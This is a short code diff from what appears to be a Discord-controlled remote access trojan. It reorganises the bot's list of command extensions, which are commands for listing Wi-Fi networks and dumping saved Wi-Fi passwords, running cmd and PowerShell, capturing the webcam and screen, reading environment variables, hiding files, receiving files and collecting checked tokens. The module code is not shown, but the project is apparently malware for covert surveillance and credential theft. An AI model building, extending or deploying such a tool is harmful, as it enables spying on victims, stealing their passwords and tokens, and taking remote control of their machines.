@@ -168,8 +168,10 @@ class closeall_confirm(discord.ui.View):
 #> Extensions
 
 extensions = (
-    "hide",           # /hidefile & /unhidefile
-    "wifi",           # /wifilist & /wifipass
+    "hideFile",       # /hidefile
+    "unhideFile",     # /unhidefile
+    "wifiList",       # /wifilist
+    "wifiPass",       # /wifipass
     "shell",          # /cmd & /powershell
     "getenv",         # /get_environment
     "webcam",         # /get_webcam
@@ -184,7 +186,7 @@ extensions = (
     "systeminfo",     # /get_systeminfo
     "screenshot",     # /get_screenshot
     "receivefiles",   # /receivefiles
-    "checkedTokens",    # /checked_tokens
+    "checkedTokens",  # /checked_tokens
 )
 
 for ex in extensions:
